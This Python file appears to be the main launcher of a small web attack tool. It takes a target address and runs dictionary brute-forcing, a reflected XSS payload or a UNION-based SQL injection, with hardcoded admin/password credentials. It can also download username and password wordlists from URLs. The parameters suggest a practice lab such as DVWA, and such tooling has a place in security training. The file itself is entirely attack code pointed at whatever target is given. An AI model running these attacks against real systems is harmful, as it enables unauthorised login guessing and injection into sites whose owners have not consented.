import sys
import argparse
import validators
import urllib.request

import bruteforce
import sqli
import xss


def main(args):
    if args.download:
        if validators.url(args.username_dict):
            print("Downloading username dictionary")
            urllib.request.urlretrieve(args.username_dict, "/tmp/usernames.txt")
            args.username_dict = "/tmp/usernames.txt"
        if validators.url(args.password_dict):
            print("Downloading password dictionary")
            urllib.request.urlretrieve(args.password_dict, "/tmp/passwords.txt")
            args.password_dict = "/tmp/passwords.txt"

    if args.attack_mode == "bruteforce":
        bruteforce.main(args)
    elif args.attack_mode == "xss":
        xss.main(args.target, "?name=<script>console.log(\"PWNED\");</script>", "admin", "password")
    elif args.attack_mode == "sqli":
        sqli.main(args.target, "?id=a' UNION SELECT \"text1\",\"text2\";-- -&Submit=Submit", "admin", "password")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(prog="python3 main.py")
    parser.add_argument("attack_mode", choices=["bruteforce", "xss", "sqli"], help="Type of attack to run, bruteforce, xss or sqli")
    parser.add_argument("target", help="Address of the target")
    parser.add_argument("-d", "--download", action="store_true", help="Download the list from the url specified in the username and password dictionaries")
    parser.add_argument("-u", "--username_dict", default="files/usernames.txt", help="Path to dictionary of usernames to attempt. Can be a link (use -d to download the list)")
    parser.add_argument("-p", "--password_dict", default="files/passwords.txt", help="Path to dictionary of passwords to attempt. Can be a link (use -d to download the list)")

    args = parser.parse_args()
    main(args)